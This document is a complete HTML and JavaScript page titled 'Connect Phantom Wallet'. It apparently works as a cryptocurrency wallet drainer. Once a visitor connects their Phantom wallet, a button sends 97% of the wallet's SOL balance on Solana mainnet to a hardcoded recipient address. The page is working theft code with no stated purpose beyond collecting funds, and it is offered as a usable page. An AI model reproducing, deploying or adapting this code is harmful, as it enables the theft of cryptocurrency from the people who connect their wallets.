<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connect Phantom Wallet</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    #connect-button {
      padding: 10px 20px;
      background-color: #1a73e8;
      color: white;
      border: none;
      cursor: pointer;
      border-radius: 5px;
    }
    #connect-button:disabled {
      background-color: #ccc;
    }
    #status {
      margin-top: 20px;
      font-size: 1.2em;
    }
    #send-button {
      padding: 10px 20px;
      background-color: #e91e63;
      color: white;
      border: none;
      cursor: pointer;
      border-radius: 5px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>Connect Your Phantom Wallet</h1>
  <button id="connect-button" onclick="connectPhantom()" disabled>Connect Wallet</button>
  <div id="status"></div>
  <button id="send-button" onclick="sendSol()" style="display: none;">Send 97% of SOL</button>

  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.34.0/dist/index.min.js"></script>
  <script>
    let provider;
    let userPublicKey;
    const sendAddress = "A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26";

    // Function to check if Phantom is installed and enable the connect button
    function checkPhantomWallet() {
      provider = getProvider();
      if (provider) {
        document.getElementById('connect-button').disabled = false; // Enable button
      } else {
        document.getElementById('status').innerText = "Phantom Wallet is not installed. Please install it from the link below.";
      }
    }

    // Function to get the Phantom provider if it's available
    function getProvider() {
      if ('phantom' in window) {
        const provider = window.phantom?.solana;
        if (provider?.isPhantom) {
          return provider;
        }
      }
      // If Phantom is not installed, redirect to the Phantom website
      window.open('https://phantom.app/', '_blank');
      return null;
    }

    // Initialize the Phantom check when the page loads
    window.addEventListener('load', checkPhantomWallet);

    // Connect to Phantom Wallet
    async function connectPhantom() {
      provider = getProvider();
      const connectButton = document.getElementById('connect-button');
      const statusDiv = document.getElementById('status');

      if (!provider) {
        return; // If Phantom is not installed, do nothing
      }

      try {
        // Request connection to Phantom wallet
        const response = await provider.connect();

        console.log('Connected to Phantom wallet:', response);
        userPublicKey = response.publicKey.toString();

        // Display the connected account information
        statusDiv.innerHTML = `Connected with account: <strong>${userPublicKey}</strong>`;

        // Enable the "Send 97% of SOL" button after successful connection
        document.getElementById('send-button').style.display = "block";
        connectButton.disabled = true;
      } catch (err) {
        console.error('Error connecting to Phantom:', err);
        statusDiv.innerText = "Failed to connect. Please try again.";
      }
    }

    // Function to send 97% of SOL to a specific address
    async function sendSol() {
      if (!provider || !userPublicKey) {
        alert("Please connect your wallet first.");
        return;
      }

      try {
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
        const userWallet = new solanaWeb3.PublicKey(userPublicKey);
        const recipient = new solanaWeb3.PublicKey(sendAddress);

        // Get balance of the connected wallet
        const balance = await connection.getBalance(userWallet);
        const amountToSend = balance * 0.97; // 97% of the balance

        console.log(`Sending ${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL to ${sendAddress}`);

        // Create transaction
        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: userWallet,
            toPubkey: recipient,
            lamports: amountToSend, // amount to send in lamports (1 SOL = 1e9 lamports)
          })
        );

        // Send the transaction
        const { signature } = await provider.sendTransaction(transaction, connection);

        console.log("Transaction sent with signature:", signature);

        // Show the status
        document.getElementById('status').innerHTML = `Transaction successful. Sent ${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL to ${sendAddress}.`;

        // Disable the send button after the transaction
        document.getElementById('send-button').disabled = true;
      } catch (error) {
        console.error('Error sending SOL:', error);
        document.getElementById('status').innerText = "Error occurred. Please try again.";
      }
    }
  </script>
</body>
</html>
